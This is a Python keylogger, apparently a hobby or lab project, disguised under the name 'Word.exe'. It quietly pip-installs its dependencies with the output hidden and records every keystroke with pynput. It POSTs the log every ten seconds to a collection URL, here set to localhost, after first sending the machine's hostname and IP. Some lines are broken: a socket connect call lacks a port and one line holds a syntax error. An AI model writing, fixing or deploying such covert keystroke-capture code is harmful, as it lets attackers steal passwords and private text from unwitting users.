import json
import socket
import subprocess
import sys
import os


def sneaky_install(package):
    try:
        __import__(package)
    except ImportError:
        try:
            #redirects pip output so no errors are recieved
            with open(os.devnull, 'w') as devnull:
                subprocess.check_call(
                    [sys.executable, "-m", "pip", "install", package], stdout=devnull, stderr=devnull
                )
        except:
            sys.exit() #Quiet exit if installation is unsuccessful
sneaky_install("pynput")
sneaky_install("requests")

import pynput.keyboard
import threading
import requests

class word:
    def __init__(self, interval, server_url, hostname, ip):
        self.log = "Word.exe Started"
        self.interval = interval
        self.server_url = server_url
        self.hostname = hostname
        self.ip = ip

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.enter:
                current_key = " [ENTER] \n"
            elif key == key.backspace:
                current_key = " [BKSP] "
            else:
                current_key = "[" +str(key).replace("Key.", "") + "] "
        self.append_to_log(current_key)
    
    def report(self):
        #Send logs
        if self.log:
            try:
                requests.post(self.server_url, data={'data': self.log}, timeout=6)
                self.log = ""
            except:
                pass
        #recurisve timing
        timer = threading.Timer(self.interval, self.report)
        timer.daemon = True
        timer.start()
    
    def start(self):
        #release with escape
        def on_release(key):
            if key == pynput.keyboard.Key.esc:
                return False
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press, on_release=on_release)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

if __name__ == "__main__":
    #nginx 
    URL = "http://127.0.0.1:8080/receive.php"

    #gather hostname
    hostname = socket.gethostname()

    #gathering local IP
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('8.8.8.8'))
        ip = s.getsockname*()[0]
    except:
        ip = "127.0.0.1"
    finally:
        s.close()
    #send metadata at startup
    try:
        requests.post(URL, json={"type": "system_info", "hostname": hostname, "ip": ip})
    except:
        pass


    #capture every 10 sec
    word_logger = word(10, URL, hostname, ip)
    word_logger.start()